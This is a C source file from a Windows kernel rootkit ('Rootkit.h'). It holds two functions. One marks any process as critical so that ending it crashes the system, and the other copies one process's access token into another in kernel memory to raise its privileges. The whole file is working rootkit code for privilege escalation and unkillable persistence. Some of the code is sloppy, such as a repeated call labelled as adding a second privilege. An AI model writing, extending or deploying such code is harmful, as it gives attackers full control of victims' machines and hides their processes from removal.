////
//		FUNCTIONS USED TO ELEVATE AND PROTECTS PROCESSES
////
#include "Rootkit.h"

NTSTATUS ProtectProcess(DWORD PID)
{
	NTSTATUS status = STATUS_SUCCESS;

	CLIENT_ID clientId;
	HANDLE handle, hToken;

	TOKEN_PRIVILEGES tkp = { 0 };
	OBJECT_ATTRIBUTES objAttr;
	ULONG BreakOnTermination = 1;

	clientId.UniqueThread = NULL;
	clientId.UniqueProcess = ULongToHandle(PID);
	InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

	status = ZwOpenProcess(&handle, PROCESS_ALL_ACCESS, &objAttr, &clientId);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] Failed to open process: %d\n", status));
		return status;
	}

	status = ZwOpenProcessTokenEx(handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, OBJ_KERNEL_HANDLE, &hToken);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] Failed to open token\n"));
		ZwClose(hToken);
		return status;
	}

	tkp.PrivilegeCount = 1;
	tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_DEBUG_PRIVILEGE);

	status = ZwAdjustPrivilegesToken(hToken, FALSE, &tkp, 0, NULL, NULL);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] Failed to adjust token\n"));
		ZwClose(hToken);
		return status;
	}

	status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] Failed to set information process\n"));
		ZwClose(hToken);
		return status;
	}
	KdPrint(("[*] Process successfully set as critical!\n"));

	tkp.Privileges[0].Luid = RtlConvertLongToLuid(SE_TCB_PRIVILEGE);
	status = ZwSetInformationProcess(handle, ProcessBreakOnTermination, &BreakOnTermination, sizeof(ULONG));
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] Failed to set information process: nr 2\n"));
		ZwClose(hToken);
		return status;
	}
	KdPrint(("[!] The process has become part of the system!\n"));
	KdPrint(("[!] You won't be able to close the process until next reboot. Closing the process will result in a blue screen\n"));

	ZwClose(hToken);
	return status;
}

NTSTATUS ProcessElevation(ULONG srcPid, ULONG targetPid)
{
	NTSTATUS status = STATUS_SUCCESS;
	PEPROCESS pTargetProcess, pSrcProcess;

	//Getting target process
	status = PsLookupProcessByProcessId(ULongToHandle(targetPid), &pTargetProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] Target PID PsLookup failed\n"));
		return status;
	}
	KdPrint(("[+] Target EProcess address: 0x%p\n", pTargetProcess));

	//Getting source process
	status = PsLookupProcessByProcessId(ULongToHandle(srcPid), &pSrcProcess);
	if (!NT_SUCCESS(status))
	{
		KdPrint(("[-] Source PID PsLookup failed\n"));
		return status;
	}

	KdPrint(("[+] Source EProcess address: 0x%p\n", pSrcProcess));
	KdPrint(("[+] Setting source token to the target token\n"));

	*(UINT64*)((UINT64)pTargetProcess + (UINT64)TOKEN) = *(UINT64*)(UINT64(pSrcProcess) + (UINT64)TOKEN);
	KdPrint(("[*] Source token copied to the target!\n"));

	return status;
}